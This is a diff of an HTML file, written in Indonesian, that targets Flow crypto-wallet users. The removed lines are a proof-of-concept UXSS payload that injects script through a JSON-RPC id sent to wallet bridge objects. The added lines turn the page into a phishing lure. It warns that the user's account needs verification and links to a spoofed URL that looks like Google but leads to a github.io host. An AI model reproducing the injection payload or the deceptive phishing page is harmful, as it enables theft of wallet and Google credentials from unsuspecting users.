@@ -1,47 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC UXSS Final</title>
+    <title>Sistem Keamanan Flow</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }
+        .card { background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn { background: #1877f2; color: white; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; }
+    </style>
 </head>
-<body style="background:#000; color:#00ef8b; text-align:center;">
-    <h1>Flow Wallet Bypass Test</h1>
-    <button id="go" style="padding:20px; background:#00ef8b; font-weight:bold;">CLICK TO BYPASS</button>
+<body>
 
-    <script>
-        document.getElementById('go').onclick = function() {
-            // Target: Situs tanpa proteksi ketat (NeverSSL)
-            const target = "http://neverssl.com";
+    <div class="card">
+        <h2>Verifikasi Akun Diperlukan</h2>
+        <p>Silakan login kembali ke akun Google Anda untuk mensinkronisasi dompet Flow.</p>
+        <br><br>
+        <a href="https://www.google.com:keamanan-anda-terancam-segera-login@0x403for.github.io/" class="btn">
+            LANJUTKAN KE GOOGLE
+        </a>
+    </div>
 
-            // PAYLOAD POLYGLOT:
-            // Menggunakan kombinasi tanda kutip dan penutup kurung 
-            // untuk mencoba memutus berbagai jenis format string di Native.
-            const p = '");}alert(origin);{("';
-
-            const request = {
-                type: 'request',
-                target: 'FuelContentScript',
-                request: {
-                    jsonrpc: '2.0',
-                    id: p,
-                    method: 'connect',
-                    params: {}
-                }
-            };
-
-            // Mencoba mengirim ke semua jembatan komunikasi yang umum
-            const bridge = window.flow || window.fcl || window.FueletWallet || window.lilico;
-
-            if (bridge) {
-                bridge.postMessage(JSON.stringify(request));
-                
-                // Jeda 300ms agar Native punya waktu memproses sebelum navigasi
-                setTimeout(() => {
-                    window.location.href = target;
-                }, 300);
-            } else {
-                alert("Objek Wallet tidak ditemukan!");
-            }
-        };
-    </script>
 </body>
 </html>
